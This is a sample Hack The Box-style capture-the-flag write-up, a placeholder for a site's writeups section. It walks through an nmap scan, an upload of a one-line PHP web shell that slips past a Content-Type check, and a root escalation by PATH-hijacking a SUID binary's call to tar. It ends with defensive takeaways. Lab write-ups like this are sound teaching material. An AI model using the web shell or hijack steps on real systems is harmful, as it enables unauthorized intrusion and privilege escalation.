---
title: "CCTV - HTB Writeup"
description: "A sample writeup that proves the writeups pipeline works end to end. Replace or delete this file once real writeups land."
locale: en
publishDate: 2026-10-05
draft: false
featured: false
tags: ["sample", "linux", "recon"]
author: "dexter"
category: htb
platform: "Hack The Box"
difficulty: easy
toc: true
image: /public/cctv.png
---

> [!NOTE]
> **This is a SAMPLE writeup.** It exists only to prove the writeups section
> builds correctly — replace or delete `src/content/writeups/sample-writeup.md`.

For educational purposes. This machine is retired; techniques below were
practiced in an authorized lab environment only.

## Summary

The target exposed a web application running an outdated file-manager plugin.
Enumeration revealed a version vulnerable to unauthenticated file upload,
which gave a foothold as the service user. A misconfigured SUID binary was
the path to root.

## Reconnaissance

An initial port scan showed two open services:

```bash
nmap -sV -sC 10.10.10.5
```

- **22/tcp** — OpenSSH 8.4
- **80/tcp** — nginx serving a custom CMS

The landing page footer leaked the CMS version, and `searchsploit` pointed at
a known upload bypass.

## Foothold

The upload filter only checked the `Content-Type` header. Sending a PHP
payload with `image/png` as the media type was enough:

```http
POST /assets/upload.php HTTP/1.1
Content-Type: image/png

<?php system($_GET["cmd"]); ?>
```

The uploaded file landed under `/uploads/`, and requesting it returned command
output.

## Privilege Escalation

`linpeas` flagged `/usr/local/bin/backup` as SUID root. The binary called
`tar` without an absolute path, so a PATH hijack was enough:

```bash
echo '/bin/sh' > /tmp/tar && chmod +x /tmp/tar
export PATH=/tmp:$PATH
/usr/local/bin/backup
```

## Takeaways

- Validate file uploads server-side by content, not by header.
- Never call executables by relative path from privileged binaries.
- Version banners are free intel — strip them.

*Sample content — not a real engagement.*
